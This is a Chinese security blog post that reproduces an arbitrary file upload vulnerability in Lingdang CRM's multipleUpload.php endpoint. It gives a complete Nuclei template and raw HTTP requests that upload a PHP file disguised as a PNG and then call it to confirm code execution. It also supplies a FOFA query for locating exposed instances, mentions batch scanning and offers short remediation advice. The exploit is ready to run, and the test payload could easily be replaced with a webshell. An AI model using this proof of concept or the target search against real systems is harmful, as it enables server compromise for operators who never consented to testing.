#  灵当CRM系统multipleUpload.php接口处存在文件上传漏洞【漏洞复现|附nuclei-POC】   
原创 kingkong  脚本小子   2024-11-19 00:35  
  
****  
**免责声明：**  
**本文内容仅供技术学习参考，请勿用于违法破坏。利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，与作者无关。如有侵权请联系删除。**  
  
****  
****  
**漏洞描述：**  
  
灵当CRM系统multipleUpload.php接口处存在文件上传漏洞。  
攻击者可通过上传包含恶意代码的文件到服务器，使恶意文件被执行，从而导致系统被入侵或遭受其他安全风险。  
  
  
01  
  
—  
  
**Nuclei POC**  
  
  
```
id: lingdang-CRM-multipleUpload_php-fileupload

info:
  name: 灵当CRM系统multipleUpload.php接口处存在文件上传漏洞
  author: kingkong
  severity: high
  metadata:
    fofa-query: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")

http:
  - raw:
      - |
        POST /crm/modules/Home/multipleUpload.php?myatt_id=1&myatt_moduel=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR

        ------WebKitFormBoundaryj7OlOPiiukkdktZR
        Content-Disposition: form-data; name="file"; filename="test.php"
        Content-Type: image/png

        <?php echo md5(123456);@unlink(__FILE__);?>
        ------WebKitFormBoundaryj7OlOPiiukkdktZR--


      - |
        GET /crm/storage/2024/November/week3/test.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
              - 'status_code_1 == 200'
              - 'status_code_2 == 200'
              - 'contains(body_1,"path")'
              - 'contains(body_2,"e10adc3949ba59abbe56e057f20f883e")'
        condition: and

```  
  
  
  
02  
  
—  
  
搜索语法  
```
FOFA：body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohndYjPDNo9xRIRpsxMShSzsNcAia5gibwEAZnEL3ic7LAK7XQZ6j28Rl2CkvWIZw98o2Biag030UY1PCxQ/640?wx_fmt=png&from=appmsg "")  
  
界面如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohndYjPDNo9xRIRpsxMShSzsNoyoibXfcyyLLvgWKpDUL03YnWqVKaZG0aX0hyg3YyibQDZYO4C19XPSg/640?wx_fmt=png&from=appmsg "")  
  
03  
  
—  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohndYjPDNo9xRIRpsxMShSzsND1MCrx9bHzSBhCvcZ5FqwrRjOibkDvvC8lGwUuibCQydFT8jF7drJFVA/640?wx_fmt=png&from=appmsg "")  
  
访问验证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohndYjPDNo9xRIRpsxMShSzsNCcBU7aogGia9na5v8X9RP2ibQ4rEN2ficFyFVAOBGL91dkMoazKKyGG6Q/640?wx_fmt=png&from=appmsg "")  
漏洞检测POC  
```
POST /crm/modules/Home/multipleUpload.php?myatt_id=1&myatt_moduel=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Connection: close
Content-Length: 222
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR
Accept-Encoding: gzip

------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: image/png

<?php echo md5(123456);@unlink(__FILE__);?>
------WebKitFormBoundaryj7OlOPiiukkdktZR--


GET /crm/storage/2024/November/week3/test.php HTTP/1.1
Host: 
```  
  
  
neclei批量检测截图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohndYjPDNo9xRIRpsxMShSzsNUrPJf0V0BkzEGicezXemsgUTtlUL7MPwGWaJXTiajpl5MbKN0y284r5g/640?wx_fmt=png&from=appmsg "")  
  
  
04  
  
—  
  
修复建议  
  
  
1、文件类型验证：仅允许上传特定类型的文件，例如图像、文档等，并拒绝可执行文件或其他潜在的恶意文件类型。  
  
2、文件大小限制：限制上传文件的大小，以防止恶意用户上传过大的文件导致服务器资源耗尽。  
  
3、文件名处理：对上传的文件进行重命名，避免使用用户提供的文件名，以防止路径遍历攻击。  
  
05  
  
—  
  
下载地址  
  
  
进入公众号点击POC可获取所有POC文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneS7aOPfDNKhvOicibVlyrkJ3A4EuUx5c5S8eAxFnF9KiaibAGJfP6ibB6ze4Rm4pZ7MI4jQibT05lTevqg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
  
  
  
